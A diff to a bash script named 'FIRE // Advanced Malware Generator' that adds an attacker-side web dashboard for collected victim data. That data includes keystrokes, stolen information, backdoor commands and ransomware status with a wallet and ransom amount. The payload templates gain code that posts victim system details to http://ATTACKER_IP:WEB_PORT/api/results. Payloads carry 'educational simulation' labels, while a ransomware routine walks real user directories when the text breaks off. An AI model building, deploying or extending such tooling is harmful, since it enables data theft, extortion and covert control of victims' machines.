@@ -15,6 +15,7 @@ BOLD='\033[1m'
 # Configuration
 DEFAULT_ATTACKER_IP="127.0.0.1"
 DEFAULT_ATTACKER_PORT="4444"
+DEFAULT_WEB_PORT="8080"
 VENV_DIR="./fire_venv"
 WORK_DIR="./fire_build"
 FINAL_NAME_WIN="pc.exe"
@@ -25,6 +26,7 @@ CONFIG_FILE=".fire_config"
 TEMP_DIR="/tmp/fire_temp_$$"
 DELIVERY_DIR="./fire_delivery"
 CLOUDFLARED_DIR="./cloudflared"
+RESULTS_DIR="./fire_results"
 
 # Advanced configuration options
 declare -A ENCRYPTION_ALGORITHMS=(
@@ -66,13 +68,14 @@ declare -A DELIVERY_METHODS=(
 )
 
 # Global variables
-SCRIPT_VERSION="7.8-Cloudflare-HTTPS-Fixed-CrossPlatform-AutoExec"
+SCRIPT_VERSION="7.95-Auto-WebInterface"
 BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
 BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
 
 # Configuration variables
 ATTACKER_IP=""
 ATTACKER_PORT=""
+WEB_PORT=""
 TARGET_OS=""
 FINAL_NAME=""
 PAYLOAD_TYPE=""
@@ -92,7 +95,10 @@ DELIVERY_TARGETS=""
 CLOUDFLARE_TUNNEL_ENABLED=false
 CLOUDFLARE_TUNNEL_URL=""
 CLOUDFLARE_TUNNEL_PORT="8080"
-AUTO_EXECUTION=true  # New variable for auto-execution
+AUTO_EXECUTION=true
+WEB_INTERFACE_ENABLED=true
+CRYPTO_WALLET=""
+KEYLOGGER_BUFFER=""
 
 # Logging system
 init_logging() {
@@ -188,7 +194,7 @@ display_banner() {
     printf '%s\n' "║    [ FIRE // Advanced Malware Generator v$SCRIPT_VERSION ]       ║"
     printf '%s\n' "║                                                              ║"
     printf '%s\n' "║    [ Build ID: $BUILD_ID | Timestamp: $BUILD_TIMESTAMP ]      ║"
-    printf '%s\n' "╚══════════════════════════════════════════════════════════╝"
+    printf '%s\n' "╚════════════════════════════════════════════════════════════╝"
     
     echo -e "\n${B}SYSTEM INFORMATION:${NC}"
     echo -e "${Y}OS:${NC} $os_info $kernel_info"
@@ -409,6 +415,7 @@ setup_environment() {
     
     mkdir -p "$TEMP_DIR"
     mkdir -p "$DELIVERY_DIR"
+    mkdir -p "$RESULTS_DIR"
     
     if [ ! -d "$VENV_DIR" ]; then
         echo -e "${Y}[*] Creating isolated Python environment...${NC}"
@@ -431,7 +438,7 @@ setup_environment() {
         log_message "WARNING" "Failed to upgrade pip/setuptools"
     fi
     
-    local required_packages=("pyinstaller" "cryptography" "requests" "psutil" "pefile" "yara-python" "flask")
+    local required_packages=("pyinstaller" "cryptography" "requests" "psutil" "pefile" "yara-python" "flask" "flask-socketio")
     
     for package in "${required_packages[@]}"; do
         if ! python3 -c "import ${package//-/_}" &> /dev/null; then
@@ -480,6 +487,18 @@ get_configuration() {
         
         if validate_port "$ATTACKER_PORT" || [ "$ATTACKER_PORT" == "$DEFAULT_ATTACKER_PORT" ]; then
             log_message "INFO" "Using attacker port: $ATTACKER_PORT"
+            break
+        else
+            echo -e "${R}[!] Invalid port number. Please enter a value between 1-65535.${NC}"
+        fi
+    done
+
+    while true; do
+        read -p "Enter web interface port [default: $DEFAULT_WEB_PORT]: " WEB_PORT
+        WEB_PORT=${WEB_PORT:-$DEFAULT_WEB_PORT}
+        
+        if validate_port "$WEB_PORT" || [ "$WEB_PORT" == "$DEFAULT_WEB_PORT" ]; then
+            log_message "INFO" "Using web port: $WEB_PORT"
             break
         else
             echo -e "${R}[!] Invalid port number. Please enter a value between 1-65535.${NC}"
@@ -550,6 +569,18 @@ get_configuration() {
         fi
     done
 
+    # Special configuration for ransomware
+    if [ "$PAYLOAD_TYPE" == "3" ]; then
+        echo -e "\n${B}RANSOMWARE CONFIGURATION:${NC}"
+        read -p "Enter your crypto wallet address (for educational demonstration): " CRYPTO_WALLET
+        if [ -n "$CRYPTO_WALLET" ]; then
+            log_message "INFO" "Crypto wallet configured: $CRYPTO_WALLET"
+        else
+            CRYPTO_WALLET="bc1qexample_address_for_educational_purposes_only"
+            log_message "INFO" "Using default educational wallet address"
+        fi
+    fi
+
     read -p "Enter custom filename (leave empty for default): " CUSTOM_NAME
     if [ -n "$CUSTOM_NAME" ]; then
         if [ "$TARGET_OS" == "Windows" ] && [[ ! "$CUSTOM_NAME" =~ \.exe$ ]]; then
@@ -573,6 +604,22 @@ get_configuration() {
     else
         echo -e "${Y}[*] Auto-execution will be disabled for this payload.${NC}"
         log_message "INFO" "Auto-execution disabled"
+    fi
+
+    # Web interface configuration
+    echo -e "\n${B}WEB INTERFACE CONFIGURATION:${NC}"
+    read -p "Enable web interface for results? [Y/n]: " web_iface
+    WEB_INTERFACE_ENABLED=true
+    if [[ "$web_iface" =~ ^[Nn]$ ]]; then
+        WEB_INTERFACE_ENABLED=false
+    fi
+    
+    if [ "$WEB_INTERFACE_ENABLED" = true ]; then
+        echo -e "${Y}[*] Web interface will be enabled on http://$ATTACKER_IP:$WEB_PORT${NC}"
+        log_message "INFO" "Web interface enabled"
+    else
+        echo -e "${Y}[*] Web interface will be disabled.${NC}"
+        log_message "INFO" "Web interface disabled"
     fi
 
     read -p "Keep build files for debugging? [y/N]: " KEEP_BUILD_FILES
@@ -714,6 +761,7 @@ save_config() {
     cat > "$CONFIG_FILE" << EOF
 ATTACKER_IP="$ATTACKER_IP"
 ATTACKER_PORT="$ATTACKER_PORT"
+WEB_PORT="$WEB_PORT"
 TARGET_OS="$TARGET_OS"
 FINAL_NAME="$FINAL_NAME"
 PAYLOAD_TYPE="$PAYLOAD_TYPE"
@@ -728,6 +776,8 @@ SHELLCODE_INJECTION=$SHELLCODE_INJECTION
 PROCESS_HOLLOWING=$PROCESS_HOLLOWING
 RUNTIME_DECRYPTION=$RUNTIME_DECRYPTION
 AUTO_EXECUTION=$AUTO_EXECUTION
+WEB_INTERFACE_ENABLED=$WEB_INTERFACE_ENABLED
+CRYPTO_WALLET="$CRYPTO_WALLET"
 KEEP_BUILD_FILES=$KEEP_BUILD_FILES
 DELIVERY_METHOD="$DELIVERY_METHOD"
 DELIVERY_TARGETS="$DELIVERY_TARGETS"
@@ -751,6 +801,7 @@ validate_config() {
     
     ! validate_ip "$ATTACKER_IP" && errors+=("Invalid attacker IP: $ATTACKER_IP")
     ! validate_port "$ATTACKER_PORT" && errors+=("Invalid attacker port: $ATTACKER_PORT")
+    ! validate_port "$WEB_PORT" && errors+=("Invalid web port: $WEB_PORT")
     
     [ "$TARGET_OS" != "Windows" ] && [ "$TARGET_OS" != "Linux" ] && [ "$TARGET_OS" != "macOS" ] && [ "$TARGET_OS" != "Cross-platform" ] && errors+=("Invalid target OS: $TARGET_OS")
     
@@ -763,6 +814,419 @@ validate_config() {
         done
         return 1
     fi
+    
+    return 0
+}
+
+# Start web interface for results
+start_web_interface() {
+    if [ "$WEB_INTERFACE_ENABLED" != true ]; then
+        return 0
+    fi
+    
+    log_message "INFO" "Starting web interface on port $WEB_PORT"
+    
+    # Create web interface script
+    cat > "$TEMP_DIR/web_interface.py" << EOF
+#!/usr/bin/env python3
+from flask import Flask, render_template_string, request, jsonify, redirect, url_for
+from flask_socketio import SocketIO, emit
+import json
+import os
+import time
+from datetime import datetime
+import threading
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'educational_purpose_only'
+socketio = SocketIO(app, cors_allowed_origins="*")
+
+# Global storage for results
+results = {
+    'system_info': {},
+    'keylogger_data': [],
+    'ransomware_data': {},
+    'backdoor_data': {},
+    'stealer_data': {},
+    'network_data': {},
+    'bricker_data': {},
+    'worm_data': {},
+    'rootkit_data': {},
+    'custom_data': {}
+}
+
+# HTML Template
+HTML_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VULCAN Results Dashboard</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; }
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 30px; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 10px; }
+        .header h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .header p { font-size: 1.2em; opacity: 0.9; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: #2d2d2d; padding: 20px; border-radius: 10px; text-align: center; border-left: 4px solid #4CAF50; }
+        .stat-card h3 { color: #4CAF50; margin-bottom: 10px; }
+        .stat-card .number { font-size: 2em; font-weight: bold; color: #fff; }
+        .tabs { display: flex; margin-bottom: 20px; background: #2d2d2d; border-radius: 10px; overflow: hidden; }
+        .tab { flex: 1; padding: 15px; text-align: center; cursor: pointer; transition: all 0.3s; border-right: 1px solid #444; }
+        .tab:last-child { border-right: none; }
+        .tab:hover { background: #3d3d3d; }
+        .tab.active { background: #4CAF50; color: #000; font-weight: bold; }
+        .tab-content { display: none; background: #2d2d2d; padding: 20px; border-radius: 10px; min-height: 400px; }
+        .tab-content.active { display: block; }
+        .log-entry { background: #1a1a1a; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 3px solid #4CAF50; font-family: monospace; }
+        .log-entry.error { border-left-color: #f44336; }
+        .log-entry.warning { border-left-color: #ff9800; }
+        .log-entry.info { border-left-color: #2196F3; }
+        .timestamp { color: #888; font-size: 0.9em; }
+        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .data-card { background: #1a1a1a; padding: 15px; border-radius: 8px; border: 1px solid #444; }
+        .data-card h4 { color: #4CAF50; margin-bottom: 10px; }
+        .keylogger-buffer { background: #000; padding: 15px; border-radius: 8px; font-family: monospace; min-height: 200px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; border: 1px solid #444; }
+        .ransomware-info { background: linear-gradient(135deg, #f44336 0%, #e91e63 100%); padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        .wallet-address { background: #000; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all; margin: 10px 0; }
+        .status-indicator { display: inline-block; width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
+        .status-online { background: #4CAF50; }
+        .status-offline { background: #f44336; }
+        .refresh-btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 10px 0; }
+        .refresh-btn:hover { background: #45a049; }
+        .footer { text-align: center; margin-top: 40px; padding: 20px; background: #2d2d2d; border-radius: 10px; color: #888; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔥 VULCAN RESULTS DASHBOARD</h1>
+            <p>Educational Security Framework - Real-time Results</p>
+            <p><span class="status-indicator status-online"></span> Live Monitoring Active</p>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Active Connections</h3>
+                <div class="number" id="active-connections">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Keys Logged</h3>
+                <div class="number" id="keys-logged">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Files Encrypted</h3>
+                <div class="number" id="files-encrypted">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Data Exfiltrated</h3>
+                <div class="number" id="data-exfiltrated">0 MB</div>
+            </div>
+        </div>
+        
+        <div class="tabs">
+            <div class="tab active" onclick="showTab('system')">System Info</div>
+            <div class="tab" onclick="showTab('keylogger')">Keylogger</div>
+            <div class="tab" onclick="showTab('ransomware')">Ransomware</div>
+            <div class="tab" onclick="showTab('backdoor')">Backdoor</div>
+            <div class="tab" onclick="showTab('stealer')">Info Stealer</div>
+            <div class="tab" onclick="showTab('network')">Network</div>
+            <div class="tab" onclick="showTab('logs')">All Logs</div>
+        </div>
+        
+        <div id="system" class="tab-content active">
+            <h3>🖥️ System Information</h3>
+            <div class="data-grid" id="system-info-grid">
+                <div class="data-card">
+                    <h4>Waiting for system data...</h4>
+                    <p>System information will appear here when the payload connects.</p>
+                </div>
+            </div>
+        </div>
+        
+        <div id="keylogger" class="tab-content">
+            <h3>⌨️ Keylogger Results</h3>
+            <button class="refresh-btn" onclick="clearKeylogger()">Clear Buffer</button>
+            <div class="keylogger-buffer" id="keylogger-buffer">
+                Waiting for keystroke data...
+            </div>
+        </div>
+        
+        <div id="ransomware" class="tab-content">
+            <h3>🔒 Ransomware Operations</h3>
+            <div class="ransomware-info">
+                <h4>💰 Ransom Payment Information</h4>
+                <p>Send payment to the following wallet address:</p>
+                <div class="wallet-address" id="wallet-address">$CRYPTO_WALLET</div>
+                <p>Amount: 0.5 BTC (Educational Demonstration Only)</p>
+            </div>
+            <div class="data-grid" id="ransomware-grid">
+                <div class="data-card">
+                    <h4>Files Encrypted</h4>
+                    <p id="files-count">0 files encrypted</p>
+                </div>
+                <div class="data-card">
+                    <h4>Encryption Status</h4>
+                    <p id="encryption-status">Waiting...</p>
+                </div>
+            </div>
+        </div>
+        
+        <div id="backdoor" class="tab-content">
+            <h3>🚪 Backdoor Connections</h3>
+            <div class="data-grid" id="backdoor-grid">
+                <div class="data-card">
+                    <h4>Connection Status</h4>
+                    <p id="connection-status">No active connections</p>
+                </div>
+                <div class="data-card">
+                    <h4>Commands Executed</h4>
+                    <p id="commands-count">0 commands</p>
+                </div>
+            </div>
+        </div>
+        
+        <div id="stealer" class="tab-content">
+            <h3>💎 Information Stealer</h3>
+            <div class="data-grid" id="stealer-grid">
+                <div class="data-card">
+                    <h4>Data Collected</h4>
+                    <p>Waiting for stolen data...</p>
+                </div>
+            </div>
+        </div>
+        
+        <div id="network" class="tab-content">
+            <h3>🌐 Network Activity</h3>
+            <div class="data-grid" id="network-grid">
+                <div class="data-card">
+                    <h4>Network Scans</h4>
+                    <p>Waiting for network data...</p>
+                </div>
+            </div>
+        </div>
+        
+        <div id="logs" class="tab-content">
+            <h3>📋 All Activity Logs</h3>
+            <div id="logs-container">
+                <div class="log-entry info">
+                    <span class="timestamp">[{{ timestamp }}]</span> System initialized - Waiting for payload connections...
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>🔥 VULCAN Educational Framework v$SCRIPT_VERSION | Educational Use Only</p>
+            <p>⚠️ This dashboard is for educational purposes in controlled environments only</p>
+        </div>
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let keyloggerData = '';
+        
+        // Tab switching
+        function showTab(tabName) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            event.target.classList.add('active');
+            document.getElementById(tabName).classList.add('active');
+        }
+        
+        // Socket event handlers
+        socket.on('system_info', function(data) {
+            updateSystemInfo(data);
+            addLog('System information received', 'info');
+        });
+        
+        socket.on('keylogger_data', function(data) {
+            keyloggerData += data.keystroke + ' ';
+            document.getElementById('keylogger-buffer').textContent = keyloggerData;
+            document.getElementById('keys-logged').textContent = keyloggerData.length;
+            addLog('Keystroke captured: ' + data.keystroke, 'info');
+        });
+        
+        socket.on('ransomware_data', function(data) {
+            updateRansomwareInfo(data);
+            addLog('Ransomware activity: ' + data.action, 'warning');
+        });
+        
+        socket.on('backdoor_data', function(data) {
+            updateBackdoorInfo(data);
+            addLog('Backdoor connection: ' + data.status, 'info');
+        });
+        
+        socket.on('stealer_data', function(data) {
+            updateStealerInfo(data);
+            addLog('Data stolen: ' + data.type, 'warning');
+        });
+        
+        socket.on('network_data', function(data) {
+            updateNetworkInfo(data);
+            addLog('Network activity: ' + data.action, 'info');
+        });
+        
+        function updateSystemInfo(data) {
+            const grid = document.getElementById('system-info-grid');
+            grid.innerHTML = '';
+            
+            for (const [key, value] of Object.entries(data)) {
+                const card = document.createElement('div');
+                card.className = 'data-card';
+                card.innerHTML = \`
+                    <h4>\${key}</h4>
+                    <p>\${value}</p>
+                \`;
+                grid.appendChild(card);
+            }
+        }
+        
+        function updateRansomwareInfo(data) {
+            if (data.files_encrypted) {
+                document.getElementById('files-count').textContent = data.files_encrypted + ' files encrypted';
+            }
+            if (data.status) {
+                document.getElementById('encryption-status').textContent = data.status;
+            }
+            if (data.files_encrypted) {
+                document.getElementById('files-encrypted').textContent = data.files_encrypted;
+            }
+        }
+        
+        function updateBackdoorInfo(data) {
+            if (data.status) {
+                document.getElementById('connection-status').textContent = data.status;
+            }
+            if (data.commands) {
+                document.getElementById('commands-count').textContent = data.commands + ' commands';
+            }
+            if (data.status === 'Connected') {
+                document.getElementById('active-connections').textContent = '1';
+            }
+        }
+        
+        function updateStealerInfo(data) {
+            const grid = document.getElementById('stealer-grid');
+            const card = document.createElement('div');
+            card.className = 'data-card';
+            card.innerHTML = \`
+                <h4>\${data.type}</h4>
+                <p>\${data.data}</p>
+            \`;
+            grid.appendChild(card);
+            
+            const size = Math.random() * 10; // Simulated data size
+            document.getElementById('data-exfiltrated').textContent = size.toFixed(2) + ' MB';
+        }
+        
+        function updateNetworkInfo(data) {
+            const grid = document.getElementById('network-grid');
+            const card = document.createElement('div');
+            card.className = 'data-card';
+            card.innerHTML = \`
+                <h4>\${data.action}</h4>
+                <p>\${data.target || 'N/A'}</p>
+            \`;
+            grid.appendChild(card);
+        }
+        
+        function addLog(message, type = 'info') {
+            const logsContainer = document.getElementById('logs-container');
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry ' + type;
+            
+            const timestamp = new Date().toLocaleString();
+            logEntry.innerHTML = \`
+                <span class="timestamp">[\${timestamp}]</span> \${message}
+            \`;
+            
+            logsContainer.appendChild(logEntry);
+            logsContainer.scrollTop = logsContainer.scrollHeight;
+        }
+        
+        function clearKeylogger() {
+            keyloggerData = '';
+            document.getElementById('keylogger-buffer').textContent = '';
+            document.getElementById('keys-logged').textContent = '0';
+            addLog('Keylogger buffer cleared', 'info');
+        }
+        
+        // Auto-refresh every 5 seconds
+        setInterval(() => {
+            socket.emit('get_status');
+        }, 5000);
+    </script>
+</body>
+</html>
+'''
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/api/results', methods=['POST'])
+def receive_results():
+    data = request.json
+    payload_type = data.get('type', 'unknown')
+    
+    if payload_type == 'system_info':
+        results['system_info'] = data
+        socketio.emit('system_info', data)
+    elif payload_type == 'keylogger':
+        results['keylogger_data'].append(data)
+        socketio.emit('keylogger_data', data)
+    elif payload_type == 'ransomware':
+        results['ransomware_data'] = data
+        socketio.emit('ransomware_data', data)
+    elif payload_type == 'backdoor':
+        results['backdoor_data'] = data
+        socketio.emit('backdoor_data', data)
+    elif payload_type == 'stealer':
+        results['stealer_data'] = data
+        socketio.emit('stealer_data', data)
+    elif payload_type == 'network':
+        results['network_data'] = data
+        socketio.emit('network_data', data)
+    elif payload_type == 'bricker':
+        results['bricker_data'] = data
+        socketio.emit('bricker_data', data)
+    elif payload_type == 'worm':
+        results['worm_data'] = data
+        socketio.emit('worm_data', data)
+    elif payload_type == 'rootkit':
+        results['rootkit_data'] = data
+        socketio.emit('rootkit_data', data)
+    elif payload_type == 'custom':
+        results['custom_data'] = data
+        socketio.emit('custom_data', data)
+    
+    return jsonify({'status': 'success'})
+
+@socketio.on('get_status')
+def get_status():
+    emit('status_update', results)
+
+if __name__ == '__main__':
+    socketio.run(app, host='0.0.0.0', port=$WEB_PORT, debug=False)
+EOF
+
+    chmod +x "$TEMP_DIR/web_interface.py"
+    
+    # Start the web interface in background
+    python3 "$TEMP_DIR/web_interface.py" &
+    local web_pid=$!
+    
+    # Save the PID for cleanup
+    echo "$web_pid" > "$TEMP_DIR/web_interface.pid"
+    
+    log_message "SUCCESS" "Web interface started on http://$ATTACKER_IP:$WEB_PORT"
+    echo -e "${G}[+] Web interface started: http://$ATTACKER_IP:$WEB_PORT${NC}"
+    echo -e "${Y}[*] Access the dashboard to view real-time results${NC}"
     
     return 0
 }
@@ -873,6 +1337,8 @@ Shellcode Injection: $SHELLCODE_INJECTION
 Process Hollowing: $PROCESS_HOLLOWING
 Runtime Decryption: $RUNTIME_DECRYPTION
 Auto-Execution Enabled: $AUTO_EXECUTION
+Web Interface Enabled: $WEB_INTERFACE_ENABLED
+Crypto Wallet: $CRYPTO_WALLET
 Delivery Method: $DELIVERY_METHOD
 EOF
                     
@@ -969,6 +1435,8 @@ Timestamp: $BUILD_TIMESTAMP
 Payload Type: $type
 Successfully Built: $success_count/3 platforms
 Auto-Execution Enabled: $AUTO_EXECUTION
+Web Interface Enabled: $WEB_INTERFACE_ENABLED
+Crypto Wallet: $CRYPTO_WALLET
 
 Files:
 - launcher.sh: Unix/Linux/macOS launcher script
@@ -983,14 +1451,21 @@ Usage:
 
 Each platform-specific executable can also be run directly.
 
+Web Interface:
+Access the results dashboard at: http://$ATTACKER_IP:$WEB_PORT
+
 Auto-Execution:
 If enabled, the payload will automatically execute upon installation.
+
+Crypto Wallet:
+For ransomware demonstrations: $CRYPTO_WALLET
 EOF
         
         echo -e "${G}[+] Cross-platform build complete!${NC}"
         echo -e "${G}[+] Successfully built $success_count/3 platforms.${NC}"
         echo -e "${G}[+] All files are in the 'cross_platform_builds' directory.${NC}"
         echo -e "${G}[+] Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
+        echo -e "${G}[+] Web interface available at: http://$ATTACKER_IP:$WEB_PORT${NC}"
         
         log_message "SUCCESS" "Cross-platform build completed: $success_count/3 platforms"
         return 0
@@ -1066,6 +1541,8 @@ Shellcode Injection: $SHELLCODE_INJECTION
 Process Hollowing: $PROCESS_HOLLOWING
 Runtime Decryption: $RUNTIME_DECRYPTION
 Auto-Execution Enabled: $AUTO_EXECUTION
+Web Interface Enabled: $WEB_INTERFACE_ENABLED
+Crypto Wallet: $CRYPTO_WALLET
 Delivery Method: $DELIVERY_METHOD
 EOF
             
@@ -1093,9 +1570,30 @@ import sys
 import time
 import platform
 import subprocess
+import requests
+import json
 
-# Auto-execution setup
+# Configuration
+ATTACKER_IP = "$attacker_ip"
+WEB_PORT = $WEB_PORT
 AUTO_EXECUTION = $AUTO_EXECUTION
+WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED
+
+def send_to_web_interface(data_type, data):
+    """Send data to web interface"""
+    if not WEB_INTERFACE_ENABLED:
+        return
+    
+    try:
+        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
+        payload = {
+            'type': data_type,
+            'timestamp': time.time(),
+            'data': data
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass  # Educational context - silent fail
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1198,24 +1696,72 @@ WantedBy=multi-user.target
         # Silently handle errors in educational context
         pass
 
+def collect_system_info():
+    """Collect system information for educational purposes"""
+    info = {
+        "system": platform.system(),
+        "node": platform.node(),
+        "release": platform.release(),
+        "version": platform.version(),
+        "machine": platform.machine(),
+        "processor": platform.processor(),
+        "python_version": platform.python_version(),
+        "executable": sys.executable,
+        "current_directory": os.getcwd(),
+        "user": os.getenv('USER', 'unknown'),
+        "home": os.getenv('HOME', 'unknown')
+    }
+    
+    # Send to web interface
+    send_to_web_interface('system_info', info)
+    
+    return info
+
+def simulate_destruction():
+    """Simulate system destruction for educational purposes"""
+    actions = [
+        "Scanning system files...",
+        "Analyzing critical system components...",
+        "Preparing system modification...",
+        "Educational demonstration in progress...",
+        "System analysis complete - No actual harm done"
+    ]
+    
+    for action in actions:
+        print(f"[EDUCATIONAL] {action}")
+        send_to_web_interface('bricker', {'action': action, 'status': 'simulated'})
+        time.sleep(1)
+    
+    # Final educational message
+    final_message = "EDUCATIONAL DEMONSTRATION COMPLETE - No actual damage caused"
+    print(f"\n{final_message}")
+    send_to_web_interface('bricker', {'action': final_message, 'status': 'completed'})
+
 def main():
     # Set up persistence if auto-execution is enabled
     setup_persistence()
     
-    print("=" * 50)
-    print("SYSTEM INFORMATION (Educational)")
-    print("=" * 50)
-    print(f"System: {platform.system()}")
-    print(f"Node: {platform.node()}")
-    print(f"Release: {platform.release()}")
-    print(f"Version: {platform.version()}")
-    print(f"Machine: {platform.machine()}")
-    print("=" * 50)
-    print("This is an educational template only.")
-    print("No harmful actions are performed.")
+    # Collect and send system information
+    system_info = collect_system_info()
+    
+    print("=" * 60)
+    print("SYSTEM BRICKER - EDUCATIONAL DEMONSTRATION")
+    print("=" * 60)
+    print(f"System: {system_info['system']} {system_info['release']}")
+    print(f"Node: {system_info['node']}")
+    print(f"User: {system_info['user']}")
+    print("=" * 60)
+    print("This is an EDUCATIONAL demonstration only.")
+    print("NO ACTUAL SYSTEM DAMAGE WILL BE PERFORMED.")
+    print("=" * 60)
+    
     if AUTO_EXECUTION:
         print("Auto-execution is enabled for educational purposes.")
-    print("=" * 50)
+    
+    # Simulate the bricker functionality
+    simulate_destruction()
+    
+    print("\nEducational demonstration complete.")
     time.sleep(3)
 
 if __name__ == "__main__":
@@ -1237,11 +1783,32 @@ import sys
 import platform
 import subprocess
 import os
+import requests
+import json
+import threading
 
-# Auto-execution setup
-AUTO_EXECUTION = $AUTO_EXECUTION
+# Configuration
 ATTACKER_IP = "$attacker_ip"
 ATTACKER_PORT = "$attacker_port"
+WEB_PORT = $WEB_PORT
+AUTO_EXECUTION = $AUTO_EXECUTION
+WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED
+
+def send_to_web_interface(data_type, data):
+    """Send data to web interface"""
+    if not WEB_INTERFACE_ENABLED:
+        return
+    
+    try:
+        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
+        payload = {
+            'type': data_type,
+            'timestamp': time.time(),
+            'data': data
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass  # Educational context - silent fail
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1313,22 +1880,53 @@ def setup_persistence():
         pass
 
 def simulate_connection():
+    """Simulate backdoor connection for educational purposes"""
     print(f"Simulating connection to {ATTACKER_IP}:{ATTACKER_PORT}")
     print("This is an educational simulation only.")
     print("No actual network connections are made.")
+    
+    # Send connection status to web interface
+    send_to_web_interface('backdoor', {
+        'status': 'Simulated Connection',
+        'target': f"{ATTACKER_IP}:{ATTACKER_PORT}",
+        'timestamp': time.time()
+    })
     
     if AUTO_EXECUTION:
         print("Auto-execution is enabled for educational purposes.")
         print("In a real scenario, this would establish a persistent connection.")
     
+    # Simulate command execution
+    commands = ["whoami", "pwd", "ls -la", "netstat -an"]
+    for i, cmd in enumerate(commands):
+        print(f"[SIMULATED] Executing command {i+1}: {cmd}")
+        send_to_web_interface('backdoor', {
+            'command': cmd,
+            'status': 'simulated',
+            'result': f'Simulated output for {cmd}'
+        })
+        time.sleep(1)
+    
     time.sleep(2)
 
-if __name__ == "__main__":
+def main():
     # Set up persistence if auto-execution is enabled
     setup_persistence()
     
+    # Send system info
+    system_info = {
+        'system': platform.system(),
+        'node': platform.node(),
+        'user': os.getenv('USER', 'unknown'),
+        'executable': os.path.abspath(sys.argv[0])
+    }
+    send_to_web_interface('system_info', system_info)
+    
     if len(sys.argv) >= 1:
         simulate_connection()
+
+if __name__ == "__main__":
+    main()
 EOF
 }
 
@@ -1345,9 +1943,33 @@ import sys
 import platform
 import subprocess
 from cryptography.fernet import Fernet
+import requests
+import json
+import time
+import hashlib
 
-# Auto-execution setup
+# Configuration
+ATTACKER_IP = "$attacker_ip"
+WEB_PORT = $WEB_PORT
 AUTO_EXECUTION = $AUTO_EXECUTION
+WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED
+CRYPTO_WALLET = "$CRYPTO_WALLET"
+
+def send_to_web_interface(data_type, data):
+    """Send data to web interface"""
+    if not WEB_INTERFACE_ENABLED:
+        return
+    
+    try:
+        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
+        payload = {
+            'type': data_type,
+            'timestamp': time.time(),
+            'data': data
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass  # Educational context - silent fail
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1418,27 +2040,127 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def demonstrate_encryption():
+def simulate_encryption():
+    """Simulate file encryption for educational purposes"""
     print("Demonstrating file encryption concepts...")
+    
+    # Generate encryption key
     key = Fernet.generate_key()
     fernet = Fernet(key)
-    data = b"Sample data for encryption demonstration"
-    encrypted = fernet.encrypt(data)
-    decrypted = fernet.decrypt(encrypted)
-    print(f"Original: {data}")
-    print(f"Encrypted: {encrypted}")
-    print(f"Decrypted: {decrypted}")
-    print("This is educational only - no files are modified.")
     
-    if AUTO_EXECUTION:
-        print("Auto-execution is enabled for educational purposes.")
-        print("In a real scenario, this would encrypt files on system startup.")
+    # Simulate finding files
+    common_dirs = []
+    if platform.system() == "Windows":
+        common_dirs = ["C:\\\\Users", "C:\\\\Documents", "C:\\\\Desktop"]
+    else:
+        common_dirs = ["/home", "/Documents", "/Desktop", "/tmp"]
+    
+    files_found = 0
+    files_encrypted = 0
+    
+    # Simulate scanning directories
+    for directory in common_dirs:
+        if os.path.exists(directory):
+            print(f"[SCANNING] {directory}")
+            try:
+                for root, dirs, files in os.walk(directory):
+                    for file in files[:5]:  # Limit to first 5 files for demo
+                        files_found += 1
+                        file_path = os.path.join(root, file)
+                        
+                        # Simulate encryption
+                        data = b"Sample data for encryption demonstration"
+                        encrypted = fernet.encrypt(data)
+                        decrypted = fernet.decrypt(encrypted)
+                        
